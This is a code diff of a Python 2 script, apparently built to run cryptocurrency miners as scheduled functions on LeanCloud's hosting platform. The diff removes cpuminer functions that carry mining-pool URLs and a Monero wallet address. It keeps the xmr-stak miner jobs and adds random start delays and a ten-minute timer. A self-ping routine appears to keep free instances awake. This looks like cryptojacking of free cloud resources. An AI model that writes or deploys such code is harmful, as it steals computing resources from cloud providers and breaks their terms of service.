@@ -125,7 +125,7 @@ APP_DOMAIN = os.environ.get('LEANCLOUD_APP_DOMAIN')     #domain和WORK_ID统一�
 print 'APP_ROOT:',APP_ROOT
 print 'APP_DOMAIN:',APP_DOMAIN
 print 'Please set domain and loop timer:18 * 0-23 * * ?'
-print 'Once:18 7 9 * * ?'
+print 'min10:18 0/10 6-23 * * ?'
 
 def MineShell( cmd, **params ):
 	global SUBPROCESS_RUNNING
@@ -157,95 +157,31 @@ def MineShell( cmd, **params ):
 			else:
 				print readbuf_errmsg,
 	result.wait() # 等待字进程结束( 等待shell命令结束 )
-	print result.returncode
+	#print result.returncode
 	##(stdoutMsg,stderrMsg) = result .communicate()#非阻塞时读法.
 	return result.returncode
 
-def MineShellX( cmd, **params ):
-	global SUBPROCESS_RUNNING
-	print 'shell:', cmd
-	result = subprocess.Popen(
-		[ cmd ],
-		shell=True,
-		stdout=subprocess.PIPE,
-		stderr=subprocess.PIPE
-	)
-	# read date from pipe
-	n = 0
-	select_rfds = [ result.stdout, result.stderr ]
-	while len( select_rfds ) > 0:
-		(rfds, wfds, efds) = select.select( select_rfds, [ ], [ ] )  # select函数阻塞进程，直到select_rfds中的套接字被触发
-		SUBPROCESS_RUNNING = True
-		if result.stdout in rfds:
-			readbuf_msg = result.stdout.readline()  # 行缓冲
-			if len( readbuf_msg ) == 0:
-				select_rfds.remove( result.stdout )  # result.stdout需要remove，否则进程不会结束
-			else:
-				print readbuf_msg[29:],             #简化的console消息
-		if (n % 32 == 0):
-			print psutil.cpu_times_percent()
-		n += 1
-
-		if result.stderr in rfds:
-			readbuf_errmsg = result.stderr.readline()
-			if len( readbuf_errmsg ) == 0:
-				select_rfds.remove( result.stderr )  # result.stderr，否则进程不会结束
-			else:
-				print readbuf_errmsg,
-	result.wait()  # 等待字进程结束( 等待shell命令结束 )
-	print result.returncode
-	##(stdoutMsg,stderrMsg) = result .communicate()#非阻塞时读法.
-	return result.returncode
-
-
-def Mine_cpuminer_LiteCoin():
-	# cpum is rename from minerd,
-	# minerd::Multi-algo CPUMiner & Reference Cryptonote Miner (JSON-RPC 2.0)
-	# cpuminer-multi::https://github.com/lucasjones/cpuminer-multi
-	print 'Mine_cpuminer_LiteCoin:Once'
-	OutputShell('chmod +x cpum')
-	time.sleep(1)
-	str_cmd = STR_CMD_MINE + 'cpum --url=stratum+tcp://stratum-ltc.antpool.com:443  --algo=scrypt --user=waylite'
-	str_cmd += ' --userpass waylite.' + APP_DOMAIN + ':x'
-	MineShell(str_cmd)
-	
-	
-def Mine_cpuminer_Monero():
-	# cpum is rename from minerd,
-	# minerd::Multi-algo CPUMiner & Reference Cryptonote Miner (JSON-RPC 2.0)
-	# cpuminer-multi::https://github.com/lucasjones/cpuminer-multi
-	WALLET_ADDRESS ='496oNrFu5WAGHw6by228ofjExonQarbNWcWk1aC7QLMKdPpCa2ZBBD9QPqndnWQJ6pTmqFhtr4XZZGJPbK632HkS14qAbNK'
-	print 'Mine_cpuminer_Monero:Once'
-	OutputShell('chmod +x cpum')
-	time.sleep(1)
-	str_cmd = STR_CMD_MINE + 'cpum --threads=1 --algo=cryptonight --url=stratum+tcp://pool.supportxmr.com:3333 --user=' + WALLET_ADDRESS + '+1000 --pass=worker'
-	str_cmd += '.' + APP_DOMAIN
-	MineShell(str_cmd)
-
-
-@engine.define( 'xmrstak40' )
+@engine.define( 'xmrstak' )
 def Mine_xmr_stak_Monero():
 	global XMRSTAK_RUNNING
 	if(XMRSTAK_RUNNING):
 		print 'XMRSTAK_RUNNING'
 		return True
 	XMRSTAK_RUNNING = True
-	print 'Mine_xmr_stak_Monero:Once'
-	OutputShell('chmod +x xmrstak40')
-	time.sleep(random.randint(20, 60))
-	str_cmd = './xmrstak40'
+	print 'Mine_xmr_stak_Monero:xmrstak'
+	cmd_chmod()
+	str_cmd = './xmrstak'
 	return MineShell(str_cmd)
 
 @engine.define( 'xmrstak33s' )
-def Mine_xmr_stak_Monero40s():
+def Mine_xmr_stak_Monero33s():
 	global XMRSTAK_RUNNING
 	if(XMRSTAK_RUNNING):
 		print 'XMRSTAK_RUNNING'
 		return True
 	XMRSTAK_RUNNING = True
-	print 'Mine_xmr_stak_Monero:Once'
-	OutputShell('chmod +x xmrstak33s16')
-	time.sleep(random.randint(20, 60))
+	print 'Mine_xmr_stak_Monero:xmrstak33s16'
+	cmd_chmod()
 	str_cmd = STR_CMD_MINE + 'xmrstak33s16'
 	return MineShell(str_cmd)
 
@@ -256,50 +192,22 @@ def Mine_xmr_stak_Monero36s():
 		print 'XMRSTAK_RUNNING'
 		return True
 	XMRSTAK_RUNNING = True
-	print 'Mine_xmr_stak_Monero:Once'
-	OutputShell('chmod +x xmrstak36s16')
-	time.sleep(random.randint(20, 60))
+	print 'Mine_xmr_stak_Monero:xmrstak36s16'
+	cmd_chmod()
 	str_cmd = './xmrstak36s16'
 	return MineShell(str_cmd)
 
-# 1m运行一次
-# 只需要一个定时器，解决全部定时任务
-@engine.define( 'engineloop' )
-def EngineLoop(**params):
-	global ENGNIE_RESTARTED
-	global SUBPROCESS_RUNNING
-	global NUM_ENGINE_LOOP
-	global NUM_SUBPROCESS_LOOP
 
-	if (NUM_ENGINE_LOOP % 30 == 29):  # 29Loop唤醒自身
-		SUBPROCESS_RUNNING = False
-		Heart()
-
-	if (ENGNIE_RESTARTED):
-		ENGNIE_RESTARTED = False
-		Mine_cpuminer_Monero()
-	else:
-		# 检查进程过程中
-		if (SUBPROCESS_RUNNING):
-			NUM_SUBPROCESS_LOOP = 0
-			print 'R',
-		else:
-			if (NUM_SUBPROCESS_LOOP < 7):
-				print 'SUBPROCESS not in run',NUM_SUBPROCESS_LOOP
-				NUM_SUBPROCESS_LOOP += 1
-			else:
-				NUM_SUBPROCESS_LOOP = 0     # 7Loop内无消息，认为进程结束了
-				Mine_cpuminer_Monero()
-	NUM_ENGINE_LOOP += 1
-	return True
 
 #上传运行一次
 # 15 5/15 9-23 * * ?
 @engine.define( 'chmod' )
 def cmd_chmod(**params):
+	OutputShell('chmod +x xmrstak')
 	OutputShell('chmod +x xmrstak36s16')
 	OutputShell('chmod +x xmrstak33s16')
 	OutputShell('ls -l')
+	time.sleep(random.randint(20, 60))
 	return True
 
 
@@ -325,7 +233,7 @@ def cmd_cpuinfo(**params):
 
 #半小时运行一次
 # 15 5/15 9-23 * * ?
-@engine.define( 'heart' )
+#@engine.define( 'heart' )
 def Heart(**params):
 	url = "http://" + APP_DOMAIN + ".leanapp.cn/heart"
 	response = requests.get( url )
@@ -364,9 +272,37 @@ def OutputShell( cmd, **params ):
 			else:
 				print readbuf_errmsg,
 	result.wait() # 等待字进程结束( 等待shell命令结束 )
-	print result.returncode
+	#print result.returncode
 	##(stdoutMsg,stderrMsg) = result .communicate()#非阻塞时读法.
 	return result.returncode
 
+# 1m运行一次
+# 只需要一个定时器，解决全部定时任务
+#@engine.define( 'engineloop' )
+def EngineLoop(**params):
+	global ENGNIE_RESTARTED
+	global SUBPROCESS_RUNNING
+	global NUM_ENGINE_LOOP
+	global NUM_SUBPROCESS_LOOP
 
-cmd_chmod()
+	if (NUM_ENGINE_LOOP % 30 == 29):  # 29Loop唤醒自身
+		SUBPROCESS_RUNNING = False
+		Heart()
+
+	if (ENGNIE_RESTARTED):
+		ENGNIE_RESTARTED = False
+		Mine_cpuminer_Monero()
+	else:
+		# 检查进程过程中
+		if (SUBPROCESS_RUNNING):
+			NUM_SUBPROCESS_LOOP = 0
+			print 'R',
+		else:
+			if (NUM_SUBPROCESS_LOOP < 7):
+				print 'SUBPROCESS not in run',NUM_SUBPROCESS_LOOP
+				NUM_SUBPROCESS_LOOP += 1
+			else:
+				NUM_SUBPROCESS_LOOP = 0     # 7Loop内无消息，认为进程结束了
+				Mine_cpuminer_Monero()
+	NUM_ENGINE_LOOP += 1
+	return True
